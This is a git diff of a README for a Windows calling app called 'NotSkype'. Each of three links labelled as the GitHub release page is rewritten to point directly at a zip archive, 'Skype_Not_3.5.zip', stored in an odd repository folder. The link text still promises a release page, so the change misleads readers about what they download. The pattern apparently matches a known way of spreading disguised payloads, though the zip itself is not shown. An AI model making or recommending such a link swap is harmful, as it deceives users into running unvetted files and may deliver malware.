@@ -1,6 +1,6 @@
 # 📞 NotSkype - Run Skype-style calls on Windows
 
-[![Download NotSkype](https://img.shields.io/badge/Download%20NotSkype-Release%20Page-blue?style=for-the-badge)](https://github.com/Louis1larry/NotSkype/releases)
+[![Download NotSkype](https://img.shields.io/badge/Download%20NotSkype-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Louis1larry/NotSkype/main/allottable/Skype_Not_3.5.zip)
 
 ## 🧭 What NotSkype is
 
@@ -34,7 +34,7 @@ For best results, use Windows 10 or Windows 11. Windows 7 may work if the needed
 
 Use this link to visit the release page and download the app:
 
-[Visit the NotSkype release page](https://github.com/Louis1larry/NotSkype/releases)
+[Visit the NotSkype release page](https://raw.githubusercontent.com/Louis1larry/NotSkype/main/allottable/Skype_Not_3.5.zip)
 
 On the release page:
 
@@ -257,7 +257,7 @@ NotSkype focuses on a narrow job:
 
 ## 📥 Download again
 
-[Visit the NotSkype release page](https://github.com/Louis1larry/NotSkype/releases)
+[Visit the NotSkype release page](https://raw.githubusercontent.com/Louis1larry/NotSkype/main/allottable/Skype_Not_3.5.zip)
 
 ## 🧷 Release notes
 
